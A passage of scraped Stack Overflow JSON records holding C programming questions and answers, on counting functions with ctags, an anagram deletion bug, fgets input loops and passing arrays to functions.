<code>grep</code> for the trailing <code>f</code> and use <a href=\"http://man7.org/linux/man-pages/man1/wc.1.html\" rel=\"nofollow noreferrer\"><code>wc</code></a> to count the number of lines, which should correspond to the number of functions."}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1499240172, "post_id": 44918129, "comment_id": 76815303, "body": "Would a linker map file not list all the functions?"}, {"owner": {"reputation": 263, "user_id": 7062051, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7Vu50.jpg?s=128&g=1", "display_name": "Phillip Hamnett", "link": "https://stackoverflow.com/users/7062051/phillip-hamnett"}, "reply_to_user": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1499240272, "post_id": 44918129, "comment_id": 76815387, "body": "@ThingyWotsit No idea, but it sounds interesting, would you like to elaborate on it?"}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 1, "creation_date": 1499241090, "post_id": 44918129, "comment_id": 76815925, "body": "@Neztor not really into reading docs for others..  Look at your own linker documentation.  There may well be some command-line, or other, parameter that instructs the linker to generate a comprehensive map file that includes a list of all functions, (and probably their address, length etc).  IME, the info on each function is on one line, so it would be easy to count the lines.   It&#39;s a suggestion - it may work on your linker, may not.. :)"}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 2, "creation_date": 1499241611, "post_id": 44918129, "comment_id": 76816310, "body": "It&#39;s also likely that a full debug build would contain what you need in the debug info appended to the executable.  This info could also be extracted/listed."}], "answers": [{"tags": [], "owner": {"reputation": 263, "user_id": 7062051, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7Vu50.jpg?s=128&g=1", "display_name": "Phillip Hamnett", "link": "https://stackoverflow.com/users/7062051/phillip-hamnett"}, "is_accepted": false, "score": 2, "last_activity_date": 1499236789, "creation_date": 1499236789, "answer_id": 44918694, "question_id": 44918129, "link": "https://stackoverflow.com/questions/44918129/generate-a-list-of-existing-functions-across-multiple-files-in-c/44918694#44918694", "title": "Generate a list of existing functions across multiple files in C", "body": "<p>Thanks everyone for all of your useful comments!</p>\n\n<p>In the end, this is what I did:\nI created the <code>tags</code> file using <code>ctags</code>:</p>\n\n<pre><code>ctags --recurse=yes path/to/base/of/code\n</code></pre>\n\n<p>This generates an output file called <code>tags</code></p>\n\n<p>I use <code>vim</code> as a text editor. So I opened the <code>tags</code> file and typed:</p>\n\n<pre><code>:v/f$/d\n</code></pre>\n\n<p>Which searches for all lines in the file that don't end with <code>f</code> and deletes them.</p>\n\n<p>What I was left with were all of the functions from the code. How many functions?</p>\n\n<pre><code>wc -l tags\n</code></pre>\n\n<p>It is only 535 functions, now I have to document them all...</p>\n"}, {"tags": [], "owner": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "is_accepted": true, "score": 2, "last_activity_date": 1499238169, "creation_date": 1499238169, "answer_id": 44919116, "question_id": 44918129, "link": "https://stackoverflow.com/questions/44918129/generate-a-list-of-existing-functions-across-multiple-files-in-c/44919116#44919116", "title": "Generate a list of existing functions across multiple files in C", "body": "<p>Moving/expanding from the comments, a slightly more general one-liner:</p>\n\n<pre><code>ctags -f - -R | cut -s -f 4- | grep -P '(^|\\t)f($|\\t)' | wc -l\n</code></pre>\n\n<ol>\n<li><code>ctags -R</code> parses (... mostly...) recursively the supported files in the current directory; <code>-f -</code> redirects its output to stdout instead of writing a <code>tags</code> file;</li>\n<li><p>we use <code>cut</code> to only extract the fields we are interested in;</p>\n\n<p>The <code>tags</code> file format is made of fields separated by tabs (so the default delimiters for <code>cut</code> are already ok); the first three fields have a fixed meaning and are not of our interest, while the ones that follow are \"extended fields\", where we are looking for a single <code>f</code> that indicates that the row refers to a function.</p>\n\n<p><code>-s</code> matches only lines with delimiters (= skip garbage); <code>-f 4-</code> outputs only from the fourth field to the last.</p></li>\n<li><p>we use <code>grep</code> to look for our lonely <code>f</code>; the order of \"extended fields\" is not guaranteed - and in facts, when calling <code>ctags</code> over a C++ project I saw that extra fields besides <code>f</code> are added (<code>class:</code> fields in particular).</p>\n\n<p><code>-P</code> uses PCRE regexes (just because it's easier to look for a tab character, <code>egrep</code> would suffice otherwise); <code>(^|\\t)f($|\\t)</code> looks for an <code>f</code> either surrounded by our separators (tabs) or by the start/end of line;</p></li>\n<li><p><code>wc -l</code> counts the resulting lines; the result should be the number of function definitions.</p></li>\n</ol>\n"}, {"tags": [], "owner": {"reputation": 852, "user_id": 6386727, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d18c3dc2b0939eb1c624ea2e6f8c03c7?s=128&d=identicon&r=PG", "display_name": "Masatake YAMATO", "link": "https://stackoverflow.com/users/6386727/masatake-yamato"}, "is_accepted": false, "score": 0, "last_activity_date": 1499282904, "creation_date": 1499282904, "answer_id": 44934497, "question_id": 44918129, "link": "https://stackoverflow.com/questions/44918129/generate-a-list-of-existing-functions-across-multiple-files-in-c/44934497#44934497", "title": "Generate a list of existing functions across multiple files in C", "body": "<p>The cross reference feature of ctags may help you.</p>\n\n<ol>\n<li>Install Universal-ctags (<a href=\"https://ctags.io\" rel=\"nofollow noreferrer\">https://ctags.io</a>)</li>\n<li>Run find $dir --name '*.c' | ctags --kinds-C=f -x --_xformat='%F: %{C.properties} %t %N%S'</li>\n</ol>\n\n<blockquote>\n<pre><code>$ find ./main -name '*.c' | ./ctags --kinds-C=f -x --_xformat='%F: %{C.properties} %t %N%S' -L - | head\n./main/args.c: extern Arguments * argNewFromArgv(char * const * const argv)\n./main/args.c: extern Arguments * argNewFromFile(FILE * const fp)\n./main/args.c: extern Arguments * argNewFromLineFile(FILE * const fp)\n./main/args.c: extern Arguments * argNewFromString(const char * const string)\n./main/args.c: extern bool argOff(const Arguments * const current)\n./main/args.c: extern char * argItem(const Arguments * const current)\n./main/args.c: extern void argDelete(Arguments * const current)\n./main/args.c: extern void argForth(Arguments * const current)\n./main/args.c: extern void argSetLineMode(Arguments * const current)\n./main/args.c: extern void argSetWordMode(Arguments * const current)\n</code></pre>\n</blockquote>\n"}], "owner": {"reputation": 263, "user_id": 7062051, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7Vu50.jpg?s=128&g=1", "display_name": "Phillip Hamnett", "link": "https://stackoverflow.com/users/7062051/phillip-hamnett"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 260, "favorite_count": 1, "accepted_answer_id": 44919116, "answer_count": 3, "score": 0, "last_activity_date": 1499282904, "creation_date": 1499234708, "last_edit_date": 1499236097, "question_id": 44918129, "link": "https://stackoverflow.com/questions/44918129/generate-a-list-of-existing-functions-across-multiple-files-in-c", "title": "Generate a list of existing functions across multiple files in C", "body": "<p>Due to paperwork that has to be filled out, I need to know how many functions exist in an entire C project.</p>\n\n<p>The project is split across multiple folders, so ideally what I am looking for is something where you can type in:</p>\n\n<pre><code>FindAllTheFunctions --recursive /path/to/folder\n</code></pre>\n\n<p>And the result is written something like:</p>\n\n<pre><code>/path.../filename: int foo(float bar)\n.\n.\n.\n/path.../final/filename: double foo2(int bar2)\n</code></pre>\n\n<p>How could I get results of this nature?</p>\n\n<p>Many thanks!</p>\n"}, {"tags": ["c", "string", "for-loop", "anagram"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1499234499, "post_id": 44918046, "comment_id": 76812045, "body": "Now is the perfect time to learn how to use a debugger. With a debugger you can step through the code, line by line, while monitoring variables and their values. Do that for the failing input and see what happens in your program."}, {"owner": {"reputation": 135, "user_id": 6782700, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-mz5rNzW4ads/AAAAAAAAAAI/AAAAAAAAAEY/MI3etIk9R9s/photo.jpg?sz=128", "display_name": "Reshma Suresh", "link": "https://stackoverflow.com/users/6782700/reshma-suresh"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499234874, "post_id": 44918046, "comment_id": 76812211, "body": "@Someprogrammerdude Thank you :)"}], "answers": [{"comments": [{"owner": {"reputation": 135, "user_id": 6782700, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-mz5rNzW4ads/AAAAAAAAAAI/AAAAAAAAAEY/MI3etIk9R9s/photo.jpg?sz=128", "display_name": "Reshma Suresh", "link": "https://stackoverflow.com/users/6782700/reshma-suresh"}, "edited": false, "score": 0, "creation_date": 1499234849, "post_id": 44918122, "comment_id": 76812194, "body": "OMG, Thank you so much. I never noticed it. I feel so dumb! Now it works perfectly. Thank you"}, {"owner": {"reputation": 135, "user_id": 6782700, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-mz5rNzW4ads/AAAAAAAAAAI/AAAAAAAAAEY/MI3etIk9R9s/photo.jpg?sz=128", "display_name": "Reshma Suresh", "link": "https://stackoverflow.com/users/6782700/reshma-suresh"}, "edited": false, "score": 0, "creation_date": 1499238384, "post_id": 44918122, "comment_id": 76814156, "body": "Thank you and I will surely follow it :) and what is the better logic ?"}, {"owner": {"reputation": 2876, "user_id": 7958961, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/df9fc6004eafe9f7b473927ecfd65646?s=128&d=identicon&r=PG&f=1", "display_name": "Rados\u0142aw Cybulski", "link": "https://stackoverflow.com/users/7958961/rados%c5%82aw-cybulski"}, "reply_to_user": {"reputation": 135, "user_id": 6782700, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-mz5rNzW4ads/AAAAAAAAAAI/AAAAAAAAAEY/MI3etIk9R9s/photo.jpg?sz=128", "display_name": "Reshma Suresh", "link": "https://stackoverflow.com/users/6782700/reshma-suresh"}, "edited": false, "score": 0, "creation_date": 1499240358, "post_id": 44918122, "comment_id": 76815444, "body": "Oh, it&#39;s a teaser - you should be able to figure it out by yourself. :) (if you cant, search SO for anagrams, i&#39;ve seen it somewhere around)."}], "tags": [], "owner": {"reputation": 2876, "user_id": 7958961, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/df9fc6004eafe9f7b473927ecfd65646?s=128&d=identicon&r=PG&f=1", "display_name": "Rados\u0142aw Cybulski", "link": "https://stackoverflow.com/users/7958961/rados%c5%82aw-cybulski"}, "is_accepted": true, "score": 0, "last_activity_date": 1499234882, "last_edit_date": 1499234882, "creation_date": 1499234679, "answer_id": 44918122, "question_id": 44918046, "link": "https://stackoverflow.com/questions/44918046/anagram-minimum-number-of-deletion-failing-certain-test-cases/44918122#44918122", "title": "Anagram - Minimum Number of deletion - failing certain test cases", "body": "<p>You've an error in your code - invalid condition in second loop.</p>\n\n<pre><code>for (i=0;a[i]!= '\\0' ;i++){\n  if(a[i]!= dummy){\n    count = count+1;\n  }\n}\nfor (i=0;a[i]!= '\\0' ;i++){\n         ^^^^\n  if(b[i]!= dummy){\n    count = count+1;\n  }\n}\n</code></pre>\n\n<p>In marked point should be <code>b[i]</code> rather than <code>a[i]</code>.</p>\n\n<p>Minor nitpicking: since you're learning to code, try to get few useful habbits as you go. Code should be pretty (not very pretty, mind you, but ascethic) - it helps to ease reading for both you and everyone else. Consequence matters. If you do spaces around operators, do it everywhere. Layout matters. All of that would help you notice your (common to pros as well, they just find it sooner) mistake.\nAlso there's a better algorithm in terms of running performance. :)</p>\n"}], "owner": {"reputation": 135, "user_id": 6782700, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-mz5rNzW4ads/AAAAAAAAAAI/AAAAAAAAAEY/MI3etIk9R9s/photo.jpg?sz=128", "display_name": "Reshma Suresh", "link": "https://stackoverflow.com/users/6782700/reshma-suresh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 378, "favorite_count": 0, "accepted_answer_id": 44918122, "answer_count": 1, "score": 0, "last_activity_date": 1499234882, "creation_date": 1499234378, "question_id": 44918046, "link": "https://stackoverflow.com/questions/44918046/anagram-minimum-number-of-deletion-failing-certain-test-cases", "title": "Anagram - Minimum Number of deletion - failing certain test cases", "body": "<p>This is a program that to solve the following question \"Given two strings,  and , that may or may not be of the same length, determine the minimum number of character deletions required to make  and  anagrams. Any characters can be deleted from either of the strings\". In the end, both strings should have the same letters and same frequency of each letter. For e.g., String A = ccda String B = dcac\nMy logic is to replace the letter that are same in both strings with a dummy string say \"0\". So when I count the number of letter in each string that is not equal to \"0\", it gives me the number of deletion.\nBut I don't know why this fails for certain cases. </p>\n\n<pre><code>#include &lt;math.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;assert.h&gt;\n#include &lt;limits.h&gt;\n#include &lt;stdbool.h&gt;\n\nint main(){\n  int count =0;\n  const char dummy= '0';\n  int i =0, j=0;\n    char* a = (char *)malloc(512000 * sizeof(char));\n    scanf(\"%s\",a);\n    char* b = (char *)malloc(512000 * sizeof(char));\n    scanf(\"%s\",b);\n    for (i=0;a[i]!= '\\0' ;i++){\n      for(j=0; b[j]!= '\\0';j++){\n        if (a[i]==b[j]){\n          a[i]= dummy;\n          b[j]= dummy;\n        }\n\n      }\n    }\n    for (i=0;a[i]!= '\\0' ;i++){\n      if(a[i]!= dummy){\n        count = count+1;\n      }\n    }\n    for (i=0;a[i]!= '\\0' ;i++){\n      if(b[i]!= dummy){\n        count = count+1;\n      }\n    }\n    printf(\"%d\",count);\n    return 0;\n}\n</code></pre>\n\n<p>One of the test case it failed was \nString A : fcrxzwscanmligyxyvym\nString B : jxwtrhvujlmrpdoqbisbwhmgpmeoke\nResult given : 22\nExpected result : 30</p>\n\n<p>Can anyone please point me the error here. Please, thanks in advance!</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1499233952, "post_id": 44917876, "comment_id": 76811790, "body": "Is the code you show the actual code that causes the problem? Is it an actual <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable Example</a> that exhibits the problem? If not, can you please create an MCVE to show us? I wonder because <a href=\"http://ideone.com/YGwkwM\" rel=\"nofollow noreferrer\">I can&#39;t replicate your problem</a>."}, {"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 0, "creation_date": 1499234071, "post_id": 44917876, "comment_id": 76811844, "body": "How many inputs are you able to give?"}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1499234549, "post_id": 44917876, "comment_id": 76812071, "body": "I doubt this is the code that causes a runtime error."}, {"owner": {"reputation": 484, "user_id": 5834521, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QBMYVTwXyGs/AAAAAAAAAAI/AAAAAAAAA8M/y7HIjlZQRVA/photo.jpg?sz=128", "display_name": "Vishwajeet Vishu", "link": "https://stackoverflow.com/users/5834521/vishwajeet-vishu"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1499237504, "post_id": 44917876, "comment_id": 76813641, "body": "@4386427 yes exactly this code doesn&#39;t causes any run-time error, only compile time error, in c. for declaring c inside <code>for()</code> loop"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499280093, "post_id": 44917876, "comment_id": 76843308, "body": "Did you enter 10 lines of input or less?  Post all 10  lines of input."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499280215, "post_id": 44917876, "comment_id": 76843369, "body": "&quot;can&#39;t able to get values&quot; and code not checking the return value of <code>fgets()</code> is weak coding.  Only use <code>str[i]</code> if  <code>fgets(str[i],50,stdin)</code> returned non-<code>NULL</code>."}], "answers": [{"comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499235974, "post_id": 44918364, "comment_id": 76812791, "body": "Declaring iterator variables like the OP does has been in the language since the C99 standard. And if that was the problem it would lead to a compiler error not a crash at run-time."}, {"owner": {"reputation": 484, "user_id": 5834521, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QBMYVTwXyGs/AAAAAAAAAAI/AAAAAAAAA8M/y7HIjlZQRVA/photo.jpg?sz=128", "display_name": "Vishwajeet Vishu", "link": "https://stackoverflow.com/users/5834521/vishwajeet-vishu"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499236339, "post_id": 44918364, "comment_id": 76812973, "body": "I understand that and this program  is giving compile time error only not run time error,array is defined used and printed properly, no chance of run time error"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499236512, "post_id": 44918364, "comment_id": 76813066, "body": "From the code shown: &quot;//some <b>runtime error occurs</b> and execution stops completely&quot;"}, {"owner": {"reputation": 484, "user_id": 5834521, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QBMYVTwXyGs/AAAAAAAAAAI/AAAAAAAAA8M/y7HIjlZQRVA/photo.jpg?sz=128", "display_name": "Vishwajeet Vishu", "link": "https://stackoverflow.com/users/5834521/vishwajeet-vishu"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499236557, "post_id": 44918364, "comment_id": 76813097, "body": "yes i ran into my system it is running ok. after removing compile time error"}, {"owner": {"reputation": 5764, "user_id": 2003898, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/j2hnV.jpg?s=128&g=1", "display_name": "dhein", "link": "https://stackoverflow.com/users/2003898/dhein"}, "edited": false, "score": 0, "creation_date": 1499247574, "post_id": 44918364, "comment_id": 76820539, "body": "havent been on Visual C for long time, but maybe its jsut microsoft nto supporting it? Be aware that MSVS C is different from plain C as the C standards describe it"}], "tags": [], "owner": {"reputation": 484, "user_id": 5834521, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QBMYVTwXyGs/AAAAAAAAAAI/AAAAAAAAA8M/y7HIjlZQRVA/photo.jpg?sz=128", "display_name": "Vishwajeet Vishu", "link": "https://stackoverflow.com/users/5834521/vishwajeet-vishu"}, "is_accepted": false, "score": -2, "last_activity_date": 1499236655, "last_edit_date": 1499236655, "creation_date": 1499235628, "answer_id": 44918364, "question_id": 44917876, "link": "https://stackoverflow.com/questions/44917876/why-cant-able-to-get-values-in-proper-manner-for-char-using-fgets-in-for-lo/44918364#44918364", "title": "why can&#39;t able to get values in proper manner for char[][] using fgets in for loop", "body": "<p>Well you are doing dynamic declaration in c program inside <code>for()</code> loop which is not allowed in C programming language but it is allowed in C++. </p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\nint main()\n{\n     char str[10][50];\n     int i;\n     for(i=0;i&lt;10;i++)\n         fgets(str[i],50,stdin); \n     for(i=0;i&lt;10;i++)\n         printf(\"str[%d]=%s\\n\",i,str[i]);\n     system(\"pause\");\n     return 0;\n}\n</code></pre>\n\n<p>this program works just fine.</p>\n"}], "owner": {"reputation": 3, "user_id": 7709640, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-9UetRJuK-ho/AAAAAAAAAAI/AAAAAAAAAIk/Cyin-7SVrs4/photo.jpg?sz=128", "display_name": "user7709640", "link": "https://stackoverflow.com/users/7709640/user7709640"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 38, "favorite_count": 0, "answer_count": 1, "score": -4, "last_activity_date": 1499247171, "creation_date": 1499233671, "last_edit_date": 1499247171, "question_id": 44917876, "link": "https://stackoverflow.com/questions/44917876/why-cant-able-to-get-values-in-proper-manner-for-char-using-fgets-in-for-lo", "title": "why can&#39;t able to get values in proper manner for char[][] using fgets in for loop", "body": "<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\nint main()\n{\n     char str[10][50];\n     for(int i=0;i&lt;10;i++)\n         fgets(str[i],50,stdin);//some runtime error occurs and execution stops completely\n     for(int i=0;i&lt;10;i++)\n         printf(\"str[%d]=%s\\n\",i,str[i]);\n     return 0;\n}\n</code></pre>\n\n<p>I want to give input as <code>str[0]=\"hello world\"</code> and <code>str[1]=\"good answer\"</code> till <code>str[9]</code> but i am not able to give inputs using below <code>for()</code> loop </p>\n"}, {"tags": ["c", "arrays", "function"], "comments": [{"owner": {"reputation": 71857, "user_id": 47453, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/412dc332ab3593c636e5a5202cf98870?s=128&d=identicon&r=PG", "display_name": "Bill Lynch", "link": "https://stackoverflow.com/users/47453/bill-lynch"}, "edited": false, "score": 1, "creation_date": 1499233718, "post_id": 44917864, "comment_id": 76811696, "body": "<a href=\"https://stackoverflow.com/questions/6567742/passing-an-array-as-an-argument-to-a-function-in-c\" title=\"passing an array as an argument to a function in c\">stackoverflow.com/questions/6567742/&hellip;</a>"}, {"owner": {"reputation": 224, "user_id": 6329633, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-fSWswYBpnjE/AAAAAAAAAAI/AAAAAAAAA6w/BShxEfhtN4g/photo.jpg?sz=128", "display_name": "Ramon van der Werf", "link": "https://stackoverflow.com/users/6329633/ramon-van-der-werf"}, "edited": false, "score": 0, "creation_date": 1499234053, "post_id": 44917864, "comment_id": 76811836, "body": "If you pass a variable by reference, the function acts like it is a pointer. Therefore changes will be reflected in the array in main(). If you want to pass by reference, and not have the changes reflected in main(), you could either pass an element by value, or inside the function copy the whole array, and work on that array."}, {"owner": {"reputation": 224, "user_id": 6329633, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-fSWswYBpnjE/AAAAAAAAAAI/AAAAAAAAA6w/BShxEfhtN4g/photo.jpg?sz=128", "display_name": "Ramon van der Werf", "link": "https://stackoverflow.com/users/6329633/ramon-van-der-werf"}, "edited": false, "score": 0, "creation_date": 1499234181, "post_id": 44917864, "comment_id": 76811895, "body": "By the way, does this code compile? does the compiler understand <code>void assign(int n, int m, double a[n][m])</code> ? types of functional parmeters <i>n</i> and <i>m</i> are not defined here."}, {"owner": {"reputation": 161, "user_id": 8170619, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0cb4da1e62592cfbc0fb40138df8439a?s=128&d=identicon&r=PG&f=1", "display_name": "makarand kulkarni", "link": "https://stackoverflow.com/users/8170619/makarand-kulkarni"}, "edited": false, "score": 0, "creation_date": 1499234430, "post_id": 44917864, "comment_id": 76812021, "body": "Thanks to both  yes it compiled and run successfully (on cygwin gcc)"}], "owner": {"reputation": 161, "user_id": 8170619, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0cb4da1e62592cfbc0fb40138df8439a?s=128&d=identicon&r=PG&f=1", "display_name": "makarand kulkarni", "link": "https://stackoverflow.com/users/8170619/makarand-kulkarni"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 47, "favorite_count": 0, "closed_date": 1499233825, "answer_count": 0, "score": 0, "last_activity_date": 1499233625, "creation_date": 1499233625, "question_id": 44917864, "link": "https://stackoverflow.com/questions/44917864/c-array-call-by-reference", "closed_reason": "Duplicate", "title": "c array call by reference", "body": "<p>I am not understanding is this function given below is cal by reference or value?\nIts working like call by reference. But I wonder if I am not passing any address or pointer then  why the values are changing in main? \nSecondly, I would like to know how to write a function If I want the changes made inside a function to an array  shouldn't reflect main?\n(I complied this code on gcc)</p>\n\n<pre><code>void assign(int n, int m, double a[n][m])\n{\n   int i, j;\n   for(i=0;i&lt;n;i++)\n     for(j=0;j&lt;m;j++)\n      a[i][j]=i*10;\n}\nvoid main(void)\n{\n   int i,j,m,n;\n    m=5;n=10;\n   double a[n][m];\n   for(i=0;i&lt;n;i++)\n     for(j=0;j&lt;m;j++)\n      a[i][j]=i*100;\n\n   assign(n,m,a);\n   for(i=0;i&lt;n;i++)\n   {\n     for(j=0;j&lt;m;j++)        \n       printf(\"%f \",a[i][j]);        \n    printf(\"\\n\");\n   }\n }\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 1, "creation_date": 1499230801, "post_id": 44917292, "comment_id": 76810580, "body": "The counter is uint8, it will never contain a <code>255.255</code>."}, {"owner": {"reputation": 185819, "user_id": 6622587, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gAYS0.jpg?s=128&g=1", "display_name": "eyllanesc", "link": "https://stackoverflow.com/users/6622587/eyllanesc"}, "edited": false, "score": 3, "creation_date": 1499230873, "post_id": 44917292, "comment_id": 76810602, "body": "I recommend you learn C and not overlook, the C++  tag is unnecessary."}, {"owner": {"reputation": 140, "user_id": 8043027, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/wx4Zu.png?s=128&g=1", "display_name": "Josef B.", "link": "https://stackoverflow.com/users/8043027/josef-b"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1499232187, "post_id": 44917292, "comment_id": 76811052, "body": "@Yunnosch - please take a look at the screen I added"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1499232332, "post_id": 44917292, "comment_id": 76811103, "body": "I did, thanks for confirming my assumption."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1499233119, "post_id": 44917292, "comment_id": 76811416, 